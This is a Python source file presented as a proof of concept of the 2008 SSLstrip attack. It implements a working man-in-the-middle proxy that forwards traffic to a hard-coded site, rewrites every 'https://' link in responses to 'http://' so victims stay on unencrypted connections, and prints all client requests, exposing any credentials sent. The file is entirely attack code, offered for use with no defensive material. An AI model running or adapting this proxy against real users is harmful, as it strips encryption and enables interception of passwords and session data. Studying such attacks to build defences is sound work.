#!/usr/bin/python
# -*- coding: utf-8

"""
This script is a Poc of the SSLstrip attack presented by Moxie at the BlackHat
conference, in 2008.
"""

__author__  = 'Amélie Risi, Brendan Guevel and Simon Duret'
__version__ = '0.1'
__license__ = 'GPL'
__status__  = 'Development'


import socket
import ssl
import sys
import re

HTTPS_URL           = [b'/index.html']
FORWARD_HOST        = 'www.t0x0sh.org'
FORWARD_HTTP_PORT   = 80
FORWARD_HTTPS_PORT  = 443
PROXY_HOST          = '127.0.0.1'
PROXY_PORT          = 4242
BUFFER_SIZE         = 65537

class SSLstrip:
    def __listen(self):
        """ Create the listenning socket for Proxy
        """
        sock = socket.socket()
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((PROXY_HOST, PROXY_PORT))
        sock.listen(5)
        self.__sock = sock

    def __https_sock(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ssl_ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        sock = ssl_ctx.wrap_socket(sock, server_hostname=FORWARD_HOST)
        sock.connect((FORWARD_HOST, FORWARD_HTTPS_PORT))
        sock.settimeout(2)
        return sock

    def __http_sock(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((FORWARD_HOST, FORWARD_HTTP_PORT))
        sock.settimeout(2)
        return sock

    def __replace_https_to_http(self, data):
        return re.sub(b'https://', b'http://', data)

    def __handle_client(self, csock, fromaddr):
        """ Handle clients connections, and forward requests.
        """
        csock.settimeout(2)
        fw_sock = None

        while True:
            data = csock.recv(BUFFER_SIZE)
            if len(data) == 0:
                if fw_sock is not None:
                    fw_sock.close()
                break

            print(data)

            if fw_sock is None:
                m = re.search(b'(GET|POST) (\S+) HTTP/\d.\d', data)
                if m is not None and m.group(2) in HTTPS_URL:
                    fw_sock = self.__https_sock()
                else:
                    fw_sock = self.__http_sock()

            fw_sock.send(data)

            data = fw_sock.recv(BUFFER_SIZE)
            while len(data) > 0:
                data = self.__replace_https_to_http(data)
                csock.send(data)
                data = fw_sock.recv(BUFFER_SIZE)

    def __accept(self):
        """ Infinite loop, accepting new client connections
        """
        while True:
            csock, fromaddr = self.__sock.accept()
            caddr, cport = fromaddr

            print("New client connected %s:%d" % (caddr, cport))

            try:
                self.__handle_client(csock, fromaddr)
            except Exception as e:
                print("error:", e)

            csock.close()
            print("Client %s:%d deconnected" % (caddr, cport))

    def run(self):
        """ Run the proxy...
        """
        self.__listen()
        print("Proxy listenning on %s:%d" % (PROXY_HOST, PROXY_PORT))
        self.__accept()


if __name__ == "__main__":
    sslstrip = SSLstrip()
    sslstrip.run()
